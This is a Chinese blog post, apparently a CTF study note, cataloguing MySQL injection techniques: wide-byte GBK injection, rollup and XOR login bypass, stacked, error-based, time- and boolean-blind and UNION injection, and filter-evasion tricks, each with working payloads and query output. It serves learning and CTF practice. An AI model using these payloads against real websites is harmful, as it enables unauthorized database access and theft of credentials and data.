{"title":"SQL注入","slug":"SQL","date":"2019-07-23T09:32:35.661Z","updated":"2019-07-31T14:00:35.723Z","comments":true,"path":"api/articles/SQL.json","photos":[],"link":"","excerpt":"大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧","covers":null,"content":"<p>大大小小比赛碰到了好多要不没见过要不不会的注入，这里记录一下吧</p>\n<a id=\"more\"></a>\n<hr>\n<h2 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h2><p>GBK是一种多字符的编码，通常来说，一个GBK编码的字符占用两个字节，一个UTF-8的字符占用三个字节。</p>\n<p><strong>转义字符</strong>：为了过滤用户输入数据，对一些特殊字符加上反斜杠”<br>“进行转义，mysql中转义函数有</p>\n<pre><code>addslashes,mysql_real_escape_string,mysql_escape_string等，还有一种是配置magic_quote_gpc,不过高版本已经移除该功能</code></pre><p><strong>宽字节注入</strong>是指mysql数据库在使用GBK编码时会认为两个字符是一个汉子(前一个字符的ascii码要大于128才到汉字范围)，而且当我们引入单引号时，mysql会调用转义函数，将单引号变为&#39;,其中的 \\ 十六进制为%5C,mysql的GBK编码会认为 %df%5C 是一个宽字节，从而使单引号闭合(逃逸)，从而注入攻击。</p>\n<p><strong>sql数据的变化过程</strong></p>\n<pre><code>%df%27--&gt;addslashes()--&gt;%df%5C%27--&gt;GBK--&gt;運&apos;\n\n用户输入--&gt;过滤函数--&gt;代码层$sql--&gt;mysql处理请求--&gt;mysql中的sql</code></pre><p>测试题目是南邮的GBK injection</p>\n<p>测试发现加上单引号没有报错但是有转义操作，在单引号前面插入了反斜杠</p>\n<pre><code>?id=1&apos;        \nyour sql:select id,title from news where id = &apos;1\\&apos;&apos;</code></pre><p>进行宽字节注入</p>\n<pre><code>?id=1%df%27\nyour sql:select id,title from news where id = &apos;1運&apos;&apos;</code></pre><p>如上所述，加入%df之后mysql认为%df%5C是一个汉字，这样单引号就逃逸出来，但是这里还会报错，因为我们人为的闭合了一个单引号之后查询语句长这样</p>\n<pre><code>id=&apos;運&apos;&apos;</code></pre><p>我们还要把最后一个单引号注释掉才行</p>\n<pre><code>?id=1%df%27%23</code></pre><p>注入成功，该查询字段数，查询字段数要用union探测内容，而union得规则是必须列数相同才能正常展示，所以要探测列数，保证构造的查询结果与元数据查询结果的数据结构相同；’order by 1’代表按第一列升序排列，数字代表的列不存在就会报错</p>\n<pre><code>?id=1%df%27 order by 2 %23\nyour sql:select id,title from news where id = &apos;1運&apos; order by 2 #&apos;\nhere is the information</code></pre><p>再探测字段的显示位，即表中数据第几位的字段可以显示。id的值要用-1或者表中没有用过的id值，否则测试值会被覆盖。</p>\n<p>接下来就是常规的注入</p>\n<pre><code>数据库\n?id=-1%df%27 union select 1,group_concat(database()) %23\n表\n?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23\n字段\n?id=-1%df%27% union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23\n因为这对单引号的转义，我们使用十六进制来读取\n信息\n?id=-1%df%27 union select 1,group_concat(flag) from ctf4 %23</code></pre><h2 id=\"ISCC中碰到的group-by…with-rollup\"><a href=\"#ISCC中碰到的group-by…with-rollup\" class=\"headerlink\" title=\"ISCC中碰到的group by…with rollup\"></a>ISCC中碰到的group by…with rollup</h2><p>题目来自ISCC线下赛hint.txt</p>\n<pre><code>$sql=&quot;SELECT pwd FROM user WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;;\n$query = mysqli_query($con,$sql); \nif (mysqli_num_rows($query) == 1) { \n    $key = mysqli_fetch_array($query);\n    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) {\n        echo &quot;xxxxxxxxx&quot;;\n    }else{\n        echo &quot;你这密码不太对啊&quot;;\n    }\n}else if(mysqli_num_rows($query) == 0){\n    echo &quot;你这密码不太对啊&quot;;\n}\nelse{\n    echo &quot;数据太多了&quot;;\n}</code></pre><p>分析题目可知我们需要post一个uname，进行弱比较相等，使得查询结果为空，然后我们也post一个空值就行了。</p>\n<p>group by 分析</p>\n<pre><code>mysql&gt; select * from member;\n+----+----------+--------------------------------------+-------------------+\n| id | username | pws                                  | email             |\n+----+----------+--------------------------------------+-------------------+\n|  1 | vince    | e10adc3949ba59abbe56e                   | vince@pikachu.com |\n|  2 | allen    | e10adc3949ba59abbe56e                   | allen@pikachu.com |\n|  3 | kobe     | e10adc3949ba59abbe56ekes                | kobe@pikachu.com  |\n|  4 | grady    | e10adc3949ba59abbe56e                 | grady@pikachu.com |\n|  5 | kevin    | e10adc3949ba59abbe56ema City Thunder | kevin@pikachu.com |\n|  6 | lucy     | e10adc3949ba59abbe56e                   | lucy@pikachu.com  |\n|  7 | lili     | e10adc3949ba59abbe56e                   | lili@pikachu.com  |\n+----+----------+--------------------------------------+-------------------+\n\nmysql&gt; select username from member where sex=&apos;boy&apos; group by username;\n+----------+\n| username |\n+----------+\n| allen|\n| grady|\n| kevin|\n| kobe |\n| vince|\n+----------+\n5 rows in set (0.00 sec)</code></pre><p>group by 对结果进行分类，而with rollup字句将在查询的结果最后一行添上一行数据，来显示分组统计的基础上再进行数据的汇总，但是这里的汇总不是简单的求和，而是要根据对数据处理采用的函数决定的</p>\n<pre><code>mysql&gt; select username from member where sex=&apos;boy&apos; group by username with rollup;\n+----------+\n| username |\n+----------+\n| allen|\n| grady|\n| kevin|\n| kobe |\n| vince|\n| NULL |\n+----------+\n6 rows in set (0.00 sec)</code></pre><p>对于这个题目，我们需要使得查询的结果不为空。可以使用异或来绕过判断。</p>\n<pre><code> mysql&gt; select 1^1;\n+-----+\n| 1^1 |\n+-----+\n|   0 |\n+-----+\n1 row in set (0.00 sec)\n\nmysql&gt; select &apos;aaa&apos;=1;\n+---------+\n| &apos;aaa&apos;=1 |\n+---------+\n|   0 |\n+---------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select &apos;id&apos;=0;\n+--------+\n| &apos;id&apos;=0 |\n+--------+\n|  1 |\n+--------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; select &apos;id111&apos;=0;\n+-----------+\n| &apos;id111&apos;=0 |\n+-----------+\n| 1 |\n+-----------+\n1 row in set, 1 warning (0.00 sec)\n\n\nuname=&apos;1&apos;^1--&gt;uname=0--&gt;相等\n#异或操作对任一操作数为NULL则返回NULL，对于非NULL得操作数，如果奇数个操作数非零，则值为1，否则为零。</code></pre><p>最后payload为：</p>\n<pre><code>uname=&apos;1&apos;^1 group by pwd with rollup limit 1 offset 1%23&apos;</code></pre><p>稍微解释一下limit offset</p>\n<pre><code>mysql&gt; select * from member limit 3 offset 1;\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n| id | username | pw   | sex | phonenum| address\n   | email |\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76\n   | allen@pikachu.com |\n|  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lak\nes | kobe@pikachu.com  |\n|  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs\n   | grady@pikachu.com |\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n3 rows in set (0.00 sec)\n\n从第一行开始打印3行数据\n\nmysql&gt; select * from member limit 1,3;\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n| id | username | pw   | sex | phonenum| address\n   | email |\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n|  2 | allen| e10adc3949ba59abbe56e057f20f883e | boy | 13676767767 | nba 76\n   | allen@pikachu.com |\n|  3 | kobe | e10adc3949ba59abbe56e057f20f883e | boy | 15988767673 | nba lak\nes | kobe@pikachu.com  |\n|  4 | grady| e10adc3949ba59abbe56e057f20f883e | boy | 13676765545 | nba hs\n   | grady@pikachu.com |\n+----+----------+----------------------------------+-----+-------------+--------\n---+-------------------+\n3 rows in set (0.00 sec)\n\n从第一行开始打印三行</code></pre><p>为什么不直接用limit 1，1 呢？</p>\n<h2 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><p>堆叠查询可以执行多条SQL语句，之间用分号’;’隔开.与union select 联合查询不同，堆叠查询可以执行任何语句，而后者只能执行有限的(列数相同)。</p>\n<pre><code>mysql&gt; show tables;\n+----------------+\n| Tables_in_ctf4 |\n+----------------+\n| admin           |\n| news           |\n+----------------+\n2 rows in set (0.00 sec)\n\nmysql&gt; select * from admin;select * from news;\n+-----+-------+----------------------------------+\n| uid | name  | pass                              |\n+-----+-------+----------------------------------+\n|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |\n+-----+-------+----------------------------------+\n1 row in set (0.04 sec)\n\n+-----+--------+--------------------------+\n| tid | title  | content                    |\n+-----+--------+--------------------------+\n|   1 | heihei | 绂绘垚鍔熷張杩戜簡涓€姝?    |\n|   2 | haha   | 椹笂灏辨垚鍔熶簡          |\n+-----+--------+--------------------------+\n2 rows in set (0.03 sec)</code></pre><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。做过的几道题都是用的MariaDB</p>\n<h2 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><ul>\n<li>关键函数</li>\n</ul>\n<p>rand() 用于产生一个0~1的随机数</p>\n<p>floor() 向下取整</p>\n<p>rand()函数生成0~1的函数，使用floor()函数向下取整，值是固定的’0’，我们将rand*2，得到的值就是不固定的0或者1。</p>\n<p>这里为什么不能直接用一个固定的常量比如1,0？而必须使用随机函数？因为我们需要使用函数在调用时会被执行的特点。</p>\n<p>这是一句简单的查询语句</p>\n<pre><code>select floor(rand(0)*2) from information_schema.tables;</code></pre><p>加上随机种子后是一个伪随机序列。同时这个报错也与数据量有关，这个我们下文会分析</p>\n<p>伪随机的序列前几位是</p>\n<pre><code>+------------------+\n| floor(rand(0)*2) |\n+------------------+\n|                0 |\n|                1 |\n|                1 |\n|                0 |\n|                1 |\n|                1 |\n|                0 |\n|                0 |\n|                1 |\n|                1 |\n|                1 |\n|                0 |\n|                1 |\n|                1 |</code></pre><p>我们使用count()和group by 来对结果进行统计，这里不加种子。</p>\n<pre><code>select count(*) from information_schema.tables group by floor(rand()*2);\n\n+----------+\n| count(*) |\n+----------+\n|       47 |\n|       50 |\n+----------+</code></pre><p>经过测试发现不加种子也有出现报错的几率，但是我们加上种子之后必然会报错。在了解原因之前我们还要再了解一下count()函数</p>\n<ul>\n<li>count()</li>\n</ul>\n<p>在进行count时对查到的数据会创建一个虚拟表用来保存结果。如果key的结果在虚拟表中已经存在则count的结果加一，否则就插入新纪录。</p>\n<p>由上文可知，floor(rand(0)*2)的结果是固定的’011011’，所以报错的原因应该是floor(rand(0)*2)的多次计算导致的。</p>\n<pre><code>floor(rand(0*2)        011011\n0            查到0，虚拟表中不存在，执行插入\n1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是1\n1            表中存在,count+1\n0            查到0，不存在，进行插入\n1            插入insert floor(rand(0)*2) into tablename;插入时再次调用函数也就是说插入的是1\n1            报错\n\nkey            count\n1            1+1\n1            报错</code></pre><p>从这里我们可以看到存在两个相同的key，主键唯一的，所以报错。表里有大于等于三条数据时就会报错。</p>\n<p>那前面说的不加种子也有几率报错是为什么？</p>\n<p>其实只要满足下面的条件就可以报错</p>\n<pre><code>查询              虚拟表插入\n第一次计算         第二次计算\n第三次计算         第四次计算</code></pre><p>只要第三次结果与第二第四都不同，同时第二第四计算相同即可</p>\n<p>我们构造下面的语句</p>\n<pre><code>select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x;\n\nERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</code></pre><p>成功返回信息</p>\n<p>如果不携带uesr()，报的是11，也就是说是concat()函数部分执行了语句</p>\n<pre><code>select count(*) from information_schema.tables group by concat(1,floor(rand(0)*2));\n\nERROR 1062 (23000): Duplicate entry &apos;11&apos; for key &apos;group_key&apos;</code></pre><ul>\n<li>其他函数</li>\n</ul>\n<p>updataxml()</p>\n<pre><code>select * from user where username = &apos;admin&apos; or updatexml(1,concat(0x7e,(database())),0);\n\nERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><p>因为第二个参数需要Xpath格式，输入不符合就报错，最大长度为32位,extractvalue()也是如此</p>\n<p>extractvalue()</p>\n<pre><code>select * from user where username = &apos;admin&apos; and extractvalue(1,concat(0x7e,(select database())))\n\nERROR 1105 (HY000): XPATH syntax error: &apos;~test1&apos;</code></pre><h2 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h2><p>主要两种，即 <strong>时间盲注</strong> ， <strong>布尔盲注</strong></p>\n<h3 id=\"时间盲注\"><a href=\"#时间盲注\" class=\"headerlink\" title=\"时间盲注\"></a>时间盲注</h3><h4 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h4><p>sleep() 睡眠时间为参数设定的秒数，然后返回0。若sleep()被中断，返回1。<br>假如这里我们有一张表</p>\n<pre><code>mysql&gt; select * from user;\n+----+--------------------------------+----------+\n| id | username                       | password |\n+----+--------------------------------+----------+\n|  1 | admin                          | 1234567  |\n|  2 | 012345678901234567890123456789 | 1234567  |\n|  3 | 012345678901234567890123456789 | 1234567  |\n|  4 | admin                          | 11111    |\n|  5 | admin                          | 222222   |\n|  6 | admin                          | 33333    |\n+----+--------------------------------+----------+\n6 rows in set (0.00 sec)</code></pre><p>我们尝试查询一条数据并设置时间为3s</p>\n<pre><code>select * from user where id = 1 and sleep(3);\nEmpty set (3.00 sec)</code></pre><p>可以看到成功延时了3s.如果我们查一条表里不存在的数据，则会直接返回，不执行sleep()。</p>\n<pre><code>select * from user where id = 9999 and sleep(3);\nEmpty set (0.00 sec)</code></pre><p>and前面的条件为假，后面的就不再看了。同样的我们测试or</p>\n<pre><code>select * from user where id = 1 or sleep(3);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | admin    | 1234567  |\n+----+----------+----------+\n1 row in set (15.01 sec)</code></pre><p>发现时间为15s,我们可以想想表里一共有6条数据，查到第一条数据时id=1为真，此时or后面的表达式不再起作用，剩下的五条数据都为假，执行5次sleep(3),因此时间为15s。</p>\n<h4 id=\"配合if条件触发\"><a href=\"#配合if条件触发\" class=\"headerlink\" title=\"配合if条件触发\"></a>配合if条件触发</h4><p>if(expr1,expr2,expr3)<br>如果expr1是TRUE(expr1&lt;&gt;0 and expr1&lt;&gt; NULL),则IF()的返回值为expr2；否则返回值是expr3。IF()的返回值为数字或则字符串具体情况视其所在语境而定。</p>\n<p>疑问 </p>\n<pre><code>mysql&gt; select * from user where id = 7 or if(1,1,0);\n+----+--------------------------------+----------+\n| id | username                       | password |\n+----+--------------------------------+----------+\n|  1 | admin                          | 1234567  |\n|  2 | 012345678901234567890123456789 | 1234567  |\n|  3 | 012345678901234567890123456789 | 1234567  |\n|  4 | admin                          | 11111    |\n|  5 | admin                          | 222222   |\n|  6 | admin                          | 33333    |\n+----+--------------------------------+----------+\n6 rows in set (0.00 sec)\n\nmysql&gt; select * from user where id = 1 or if(1,1,0);\n+----+--------------------------------+----------+\n| id | username                       | password |\n+----+--------------------------------+----------+\n|  1 | admin                          | 1234567  |\n|  2 | 012345678901234567890123456789 | 1234567  |\n|  3 | 012345678901234567890123456789 | 1234567  |\n|  4 | admin                          | 11111    |\n|  5 | admin                          | 222222   |\n|  6 | admin                          | 33333    |\n+----+--------------------------------+----------+\n6 rows in set (0.00 sec)</code></pre><p>在不知道字段值的情况下可以通过此种方法得到内容</p>\n<pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(1,1,0);\n+----+--------------------------------+----------+\n| id | username                       | password |\n+----+--------------------------------+----------+\n|  1 | admin                          | 1234567  |\n|  2 | 012345678901234567890123456789 | 1234567  |\n|  3 | 012345678901234567890123456789 | 1234567  |\n|  4 | admin                          | 11111    |\n|  5 | admin                          | 222222   |\n|  6 | admin                          | 33333    |\n+----+--------------------------------+----------+\n6 rows in set (0.00 sec)</code></pre><h5 id=\"字符串截取函数\"><a href=\"#字符串截取函数\" class=\"headerlink\" title=\"字符串截取函数\"></a>字符串截取函数</h5><p>substr(str,postion,lines) 从str的第postion个字符开始截取lines长度的字符。</p>\n<p>substring(str,FROM pos FOR len),这里可以不使用逗号。这两个函数如果我们不指定长度就会返回从查到的第一个字符开始的剩下所有字符。</p>\n<p>substring_index(str,关键字，关键字出现次数)。返回str满足出现次数的之前的字符(如果第三个参数是负数则倒着来)</p>\n<pre><code>mysql&gt; select * from user where username = &apos;&apos; or if(substr((select username from user where id=1),1,1)=&apos;a&apos;,sleep(2),0);\nEmpty set (12.00 sec)</code></pre><p>如果id=1的这条数据第一个字符为’a’，则sleep2s.</p>\n<pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,sleep(2),null);\nEmpty set (2.00 sec)</code></pre><p>逐字符查询数据库名。</p>\n<h4 id=\"配合-case-when…then…else…end-触发\"><a href=\"#配合-case-when…then…else…end-触发\" class=\"headerlink\" title=\"配合 case when…then…else…end 触发\"></a>配合 case when…then…else…end 触发</h4><pre><code> select case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end from user;\n+----------------------------------------------------------+\n| case when username = &apos;admin&apos; then &apos;admin&apos; else &apos;xxx&apos; end |\n+----------------------------------------------------------+\n| admin                                                    |\n| xxx                                                      |\n| xxx                                                      |\n| admin                                                    |\n| admin                                                    |\n| admin                                                    |\n+----------------------------------------------------------+\n6 rows in set (0.00 sec)</code></pre><h3 id=\"除了sleep之外的函数\"><a href=\"#除了sleep之外的函数\" class=\"headerlink\" title=\"除了sleep之外的函数\"></a>除了sleep之外的函数</h3><h4 id=\"BENCHMARK-count-expr\"><a href=\"#BENCHMARK-count-expr\" class=\"headerlink\" title=\"BENCHMARK(count,expr)\"></a>BENCHMARK(count,expr)</h4><p>BENCHMARK()函数重复count次执行expr。它可以被用于计算MYSQL处理表达式的速度。结果值通常为0。</p>\n<pre><code>select benchmark(10000000,sha(1));</code></pre><p>我们结合上面的语句</p>\n<pre><code>select * from user where id = 1 and if(ascii(substr(database(),1,1))=116,benchmark(10000000,sha(1)),null);</code></pre><h4 id=\"笛卡尔积\"><a href=\"#笛卡尔积\" class=\"headerlink\" title=\"笛卡尔积\"></a>笛卡尔积</h4><pre><code>select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C;</code></pre><p>通过计算来延时</p>\n<pre><code>mysql&gt; select count(*) from user;\n+----------+\n| count(*) |\n+----------+\n|        6 |\n+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select count(*) from user A,user B;\n+----------+\n| count(*) |\n+----------+\n       36 |\n+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select count(*) from user A,user B,user C;\n+----------+\n| count(*) |\n+----------+\n|      216 |\n+----------+\n1 row in set (0.00 sec)\n\n例如：\nselect * from user where id = 1 and if(ascii(substr(database(),1,1))=116,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.columns C),null);</code></pre><h4 id=\"GET-LOCK\"><a href=\"#GET-LOCK\" class=\"headerlink\" title=\"GET_LOCK\"></a>GET_LOCK</h4><p>GET_LOCK(str,timeout)</p>\n<p>设法使字符串str给定的名字得到一个锁，超时为timeout秒.</p>\n<p>select GET_LOCK(‘a’,1)</p>\n<p>但是上锁后必须在使用长连接能开启两个会话的时候才起作用。</p>\n<h4 id=\"RLIKE\"><a href=\"#RLIKE\" class=\"headerlink\" title=\"RLIKE\"></a>RLIKE</h4><p>通过rpad或repeat 构造长字符串，加以计算量大的pattern，通过repeat的参数控制延时长短。</p>\n<p>   <code>select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;</code></p>\n<h3 id=\"布尔盲注\"><a href=\"#布尔盲注\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h3><h3 id=\"函数-1\"><a href=\"#函数-1\" class=\"headerlink\" title=\"函数\"></a>函数</h3><p>截取函数</p>\n<pre><code>mid(column_name,start[,length])\nmysql&gt; select mid(&apos;abc&apos;,1,1);\n+----------------+\n| mid(&apos;abc&apos;,1,1) |\n+----------------+\n| a              |\n+----------------+\n1 row in set (0.00 sec)\n\n\nleft(str,lengt) 从左开始截取字符串\nright(str,length) 从右截取 \nmysql&gt; select right(&apos;abcda&apos;,3);\n+------------------+\n| right(&apos;abcda&apos;,3) |\n+------------------+\n| cda              |\n+------------------+\n1 row in set (0.00 sec)\n\n转ascii类型\nascii(str)/ord(str)  返回字符串首字母的ascii值</code></pre><p>布尔盲注与时间盲注差别不大</p>\n<p>常用payload </p>\n<pre><code>ascii(substr((select password from user) from 1 for 1))&lt;127</code></pre><h2 id=\"UNION-联合查询注入\"><a href=\"#UNION-联合查询注入\" class=\"headerlink\" title=\"UNION 联合查询注入\"></a>UNION 联合查询注入</h2><p>关于UNION 的用法请参考第一节。</p>\n<p>使用联合查询注入利用的前提是页面有回显位。</p>\n<p>所谓回显位是指在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展现在页面中，这个展示数据的位置就叫回显位。</p>\n<p>联合查询的基本步骤</p>\n<ol>\n<li>找到注入点判断闭合方式</li>\n<li>判断数据库类型</li>\n<li>判断查询列数</li>\n<li>判断回显位</li>\n<li>获取数据库名</li>\n<li>获取表名</li>\n<li>获取字段名</li>\n<li>获取字段中的数据</li>\n</ol>\n<p>ORDER BY子句是基于一个或多个字段按照升序或降序对其中的数据进行排序。一些数据库默认的对查询结果进行升序排序，例如mysql。</p>\n<p>我们可以指定字段名进行排序。这里我们有一张表</p>\n<pre><code>+----+----------+-----+-----------+----------+\n| ID | NAME     | AGE | ADDRESS   | SALARY   |\n+----+----------+-----+-----------+----------+\n|  1 | Ramesh   |  32 | Ahmedabad |  2000.00 |\n|  2 | Khilan   |  25 | Delhi     |  1500.00 |\n|  3 | kaushik  |  23 | Kota      |  2000.00 |\n|  4 | Chaitali |  25 | Mumbai    |  6500.00 |\n|  5 | Hardik   |  27 | Bhopal    |  8500.00 |\n|  6 | Komal    |  22 | MP        |  4500.00 |\n|  7 | Muffy    |  24 | Indore    | 10000.00 |\n+----+----------+-----+-----------+----------+</code></pre><p>查询语句例如 </p>\n<pre><code>SELECT * FROM CUSTOMERS\n   ORDER BY NAME, SALARY;</code></pre><p>查询结果如下</p>\n<pre><code>+----+----------+-----+-----------+----------+\n| ID | NAME     | AGE | ADDRESS   | SALARY   |\n+----+----------+-----+-----------+----------+\n|  4 | Chaitali |  25 | Mumbai    |  6500.00 |\n|  5 | Hardik   |  27 | Bhopal    |  8500.00 |\n|  3 | kaushik  |  23 | Kota      |  2000.00 |\n|  2 | Khilan   |  25 | Delhi     |  1500.00 |\n|  6 | Komal    |  22 | MP        |  4500.00 |\n|  7 | Muffy    |  24 | Indore    | 10000.00 |\n|  1 | Ramesh   |  32 | Ahmedabad |  2000.00 |\n+----+----------+-----+-----------+----------+</code></pre><p>同时，我们也可以指定字段的栏位进行排序，第一个字段为1，第二个为2，以此类推。</p>\n<p>这里我们有一张表</p>\n<pre><code>+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb        |\n|  2 | Angelina | I-kill-you |\n|  3 | Dummy    | p@ssword   |\n|  4 | secure   | crappy      |\n|  5 | stupid   | stupidity  |\n|  6 | superman | genious     |\n|  7 | batman   | mob!le      |\n|  8 | admin    | admin       |\n|  9 | admin1   | admin1      |\n| 10 | admin2   | admin2      |\n| 11 | admin3   | admin3      |\n| 12 | dhakkan  | dumbo       |\n| 14 | admin4   | admin4      |\n| 15 | admin#   | 789          |\n+----+----------+------------+</code></pre><p>我们使用栏位进行查询</p>\n<pre><code>select * from users order by 3;</code></pre><p>查询结果按照第三栏进行排序</p>\n<pre><code>+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n| 15 | admin#   | 789         |\n|  8 | admin    | admin       |\n|  9 | admin1   | admin1      |\n| 10 | admin2   | admin2      |\n| 11 | admin3   | admin3      |\n| 14 | admin4   | admin4      |\n|  4 | secure   | crappy      |\n|  1 | Dumb     | Dumb        |\n| 12 | dhakkan  | dumbo       |\n|  6 | superman | genious     |\n|  2 | Angelina | I-kill-you |\n|  7 | batman   | mob!le      |\n|  3 | Dummy    | p@ssword   |\n|  5 | stupid   | stupidity  |\n+----+----------+------------+</code></pre><p>如果我们查询一个不存在的栏位呢？</p>\n<pre><code>select * from users order by 4;</code></pre><p>数据库将会报错</p>\n<pre><code>ERROR 1054 (42S22): Unknown column &apos;4&apos; in &apos;order clause&apos;</code></pre><p>基于此，我们可以利用二分法来对列数进行猜解。</p>\n<p>我们使用UNION来判断回显位，UNION的作用是将两个select查询结果合并</p>\n<pre><code>select id,username from users where id=4 union select 1,2;</code></pre><p>查询结果如下</p>\n<pre><code>+----+----------+\n| id | username |\n+----+----------+\n|  4 | secure   |\n|  1 | 2          |\n+----+----------+</code></pre><p>在展示数据的时候通常指取结果集的第一行数据，如果我们想取出后半部分的结果，就要使原来的查询查不出结果</p>\n<pre><code>select id,username from users where id=-4 union select 1,2;</code></pre><p>通过查询负数，这样就可以得到我们先要的数据了</p>\n<pre><code>+----+----------+\n| id | username |\n+----+----------+\n|  1 | 2        |\n+----+----------+</code></pre><p>得到回显位之后，获取数据库名就在回显位使用database()函数</p>\n<pre><code>select id,username from users where id=-4 union select 1,database();</code></pre><p>接下来查询库中所有表名，仍然是在回显位进行查询</p>\n<pre><code>select id,username from users where id=-4 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();</code></pre><p>然后是表中的列名</p>\n<pre><code>select id,username from users where id=-4 union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;;</code></pre><p>最后是数据</p>\n<pre><code>select id,username from users where id=-4 union select 1,username from users;</code></pre><h2 id=\"Bypass\"><a href=\"#Bypass\" class=\"headerlink\" title=\"Bypass\"></a>Bypass</h2><h3 id=\"关键词过滤\"><a href=\"#关键词过滤\" class=\"headerlink\" title=\"关键词过滤\"></a>关键词过滤</h3><p>对于某些特定关键词过滤比如 from,union,select等我们可以通过双写或大小写混写进行绕过。</p>\n<p>空格绕过： /**/ /*!*/  %09 %0A %0B %0C %0D %A0 %20</p>\n<p>在实际使用中我们也可以使用1个<code>*/</code>来闭合多个<code>/*!</code>.</p>\n<pre><code>SELECT * from users where id = 1/*!union/*!select/*!1,(select/*!password/*!from/*!users/*!limit/*!1,1),3*/;\n+----+------------+----------+\n| id | username   | password |\n+----+------------+----------+\n|  1 | Dumb         | Dumb      |\n|  1 | I-kill-you | 3         |\n+----+------------+----------+</code></pre><p>函数替换：</p>\n<pre><code>mid(&apos;aaa&apos;,1,1) &lt;==&gt; left(&apos;aaa&apos;,1) &lt;==&gt; substr(&apos;aaa&apos;,1,1) &lt;==&gt; substring(&apos;aaa&apos;,1,1)\n\nconcat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt; group\\_concat(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;) &lt;==&gt;  concat\\_ws(&apos;b&apos;,&apos;a&apos;,&apos;c&apos;)</code></pre><p>逗号绕过：</p>\n<p>union select 联合查询的逗号被过滤时我们可以使用<code>join</code>进行注入</p>\n<pre><code>select * from emails where id = 1.1 union select * from (select 1)a join (select 2)b;</code></pre><p>字符串截取函数中的逗号绕过</p>\n<p>m<code>id(&#39;abc&#39; from 1 for 1) &lt;==&gt; substr(&#39;abc&#39; from 1 for 1) &lt;==&gt; substring(&#39;abc&#39; from 1 for 1)</code></p>\n<p>Limit中逗号绕过</p>\n<pre><code>select * from emails limit 1,1; &lt;==&gt; select * from emails limit 1 offset 1;</code></pre><p><code>=</code>绕过</p>\n<p>可以用like、regexp、rlike、in、between…and…绕过</p>\n<p>比较符绕过<br>！= &lt;==&gt; &lt;&gt;</p>\n<h3 id=\"关键函数过滤\"><a href=\"#关键函数过滤\" class=\"headerlink\" title=\"关键函数过滤\"></a>关键函数过滤</h3><p>如果过滤了<code>information</code>关键字无法使用<code>information_schema.tables</code>等表的话我们可以通过innodb引擎进行注入。 在Mysql5.6以上版本中，系统Mysql库中存在两张与innodb相关的表 <code>innodb_table_stats</code> 和 <code>innodb_index_stats</code>。</p>\n<pre><code>select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();\n\nselect group_concat(table_name) from mysql.innodb_index_stats where database_name=database();</code></pre><p>同时我们也可以通过查询一个不存在的自定义函数来获得数据库名</p>\n<pre><code>select * from users where id=haa();\nERROR 1305 (42000): FUNCTION security.haa does not 